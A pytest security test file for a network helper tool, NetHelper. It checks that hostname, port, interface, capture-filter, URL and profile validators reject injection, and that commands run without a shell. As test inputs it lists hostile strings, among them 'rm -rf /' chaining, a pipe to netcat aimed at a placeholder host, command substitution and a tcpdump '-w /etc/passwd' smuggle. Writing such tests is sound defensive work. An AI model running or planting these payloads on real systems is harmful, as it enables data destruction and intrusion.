"""
Security tests: input validation and safe command execution.

NetHelper passes user-typed hostnames, ports, interface names and capture
filters to external programs (ping, tcpdump, pktmon, netsh). These tests prove
the two defensive layers work:
  1. validate.py rejects malicious or malformed input outright, and
  2. cmd.py never involves a shell, so even text that slipped through would be
     treated as a single literal argument, not as extra commands.
Each test names the attack it blocks.
"""

from __future__ import annotations

import sys

import pytest

from nethelper.core import cmd, validate
from nethelper.core.config import ProfileError, parse_profile
from nethelper.net import capture


@pytest.mark.parametrize("bad", [
    "-S 10.0.0.5",            # argument injection: would be read as a ping option
    "--help",                 # option injection
    "host;rm -rf /",          # shell command chaining
    "host && calc",           # cmd.exe chaining
    "host|nc evil 4444",      # pipe
    "$(reboot)",              # command substitution
    "`id`",                   # backtick substitution
    "a" * 300,                # over-long name
    "bad..name",              # empty label
    "-bad.example.com",       # leading hyphen
    "name with space",
    "",                       # empty
])
def test_hostname_rejects_injection_and_malformed(bad):
    """Blocks command/argument injection through the hostname field."""
    with pytest.raises(validate.ValidationError):
        validate.hostname(bad)


@pytest.mark.parametrize("good", ["server01", "fs.acme.local", "8.8.8.8", "2606:4700::1111", "_ldap._tcp.acme.local",
                                  "[2001:db8::1]", "example.com."])
def test_hostname_accepts_legitimate(good):
    """Legitimate names and IPs still work (validation isn't over-strict)."""
    assert validate.hostname(good)


@pytest.mark.parametrize("bad", ["0", "65536", "-1", "abc", "22;ls"])
def test_port_rejects_out_of_range_and_garbage(bad):
    """Blocks invalid port values (and injection via the port field)."""
    with pytest.raises(validate.ValidationError):
        validate.port(bad)


def test_port_range_is_capped():
    """Blocks accidentally launching a 65,000-port scan from a typo."""
    with pytest.raises(validate.ValidationError):
        validate.ports("1-65535")
    assert validate.ports("80,443,8000-8002") == [80, 443, 8000, 8001, 8002]


def test_cidr_sweep_size_is_capped():
    """Blocks a mistyped /8 from turning into a 16-million-address sweep."""
    with pytest.raises(validate.ValidationError):
        validate.cidr("10.0.0.0/8")
    assert validate.cidr("192.168.1.0/24").num_addresses == 256


@pytest.mark.parametrize("bad", ["-i eth0", "eth0;reboot", "eth0|x", "eth0$(id)", "eth0`id`", 'a"b'])
def test_interface_names_reject_injection(bad):
    """Blocks injection through interface names passed to tcpdump/netsh/ip."""
    with pytest.raises(validate.ValidationError):
        validate.interface(bad)


@pytest.mark.parametrize("good", ["eth0", "eth0.20", "Wi-Fi", "Ethernet 2", "en0", r"\Device\NPF_{1234-ABCD}"])
def test_interface_names_accept_real_names(good):
    """Real Windows/Linux/macOS/Npcap adapter names are accepted."""
    assert validate.interface(good) == good


def test_bpf_filter_rejects_option_injection():
    """Blocks smuggling tcpdump options (e.g. -w to overwrite a file) via the filter."""
    with pytest.raises(validate.ValidationError):
        validate.bpf_filter("-w /etc/passwd")
    with pytest.raises(validate.ValidationError):
        validate.bpf_filter("port 53\n-w x")


def test_capture_preset_validation():
    """Unknown presets and malicious host:/port: presets are rejected before any capture runs."""
    with pytest.raises(validate.ValidationError):
        capture.bpf_for(capture.CaptureSpec(preset="nonsense"))
    with pytest.raises(validate.ValidationError):
        capture.bpf_for(capture.CaptureSpec(preset="host:1.2.3.4;reboot"))
    assert capture.bpf_for(capture.CaptureSpec(preset="host:10.0.0.5")) == "host 10.0.0.5"
    assert capture.bpf_for(capture.CaptureSpec(preset="port:53")) == "port 53"


def test_url_validation_blocks_non_http_schemes():
    """Blocks file://, javascript: and similar schemes from reaching the HTTP client."""
    for bad in ("file:///etc/passwd", "ftp://x/", "javascript:alert(1)", "http://-bad/"):
        with pytest.raises(validate.ValidationError):
            validate.url(bad)
    assert validate.url("example.com") == "https://example.com"


def test_safe_text_strips_terminal_escape_sequences():
    """Blocks ANSI escape injection: a hostile SSID/banner can't rewrite the terminal."""
    hostile = "evil\x1b[2J\x1b[31mSSID\x07"
    cleaned = validate.safe_text(hostile)
    assert "\x1b" not in cleaned and "\x07" not in cleaned


def test_cmd_run_never_uses_a_shell():
    """
    Proves shell metacharacters are passed literally: the child receives the
    whole string as ONE argument and nothing after '&'/';' is executed.
    """
    payload = "x & echo PWNED ; echo PWNED2 | more"
    res = cmd.run([sys.executable, "-c", "import sys; print(repr(sys.argv[1:]))", payload], timeout=30)
    assert res.ok
    assert repr([payload]) in res.stdout
    assert "PWNED\n" not in res.stdout.replace("\r", "")


def test_cmd_run_rejects_string_commands():
    """A single command-line string (which invites shell parsing) is refused outright."""
    with pytest.raises(ValueError):
        cmd.run("ping 127.0.0.1")  # type: ignore[arg-type]
    with pytest.raises(TypeError):
        cmd.run(["echo", 5])  # type: ignore[list-item]


def test_cmd_run_reports_missing_program_and_timeout():
    """Missing tools and hung tools are reported, never crash or hang NetHelper."""
    missing = cmd.run(["definitely-not-a-real-program-xyz"])
    assert missing.error and not missing.ok
    slow = cmd.run([sys.executable, "-c", "import time; time.sleep(10)"], timeout=1)
    assert slow.error and "timed out" in slow.error


def test_profile_rejects_injected_hosts_and_bad_values():
    """A tampered profile can't smuggle injection payloads or out-of-range values in."""
    with pytest.raises(ProfileError):
        parse_profile({"targets": [{"name": "x", "host": "fs01;calc"}]})
    with pytest.raises(ProfileError):
        parse_profile({"expected": {"vlan": 5000}})
    with pytest.raises(ProfileError):
        parse_profile({"targets": [{"name": "x", "host": "fs01", "ports": [70000]}]})
    with pytest.raises(ProfileError):
        parse_profile({"services": [{"host": "mail", "kind": "gopher"}]})
    p = parse_profile({"bogus": {}, "expected": {"vlan": 20, "subnet": "10.0.20.5/24", "gateway_mac": "AA-BB-CC-DD-EE-FF"}})
    assert p.expected.subnet == "10.0.20.0/24"
    assert p.expected.gateway_mac == "aa:bb:cc:dd:ee:ff"
    assert any("bogus" in w for w in p.warnings)
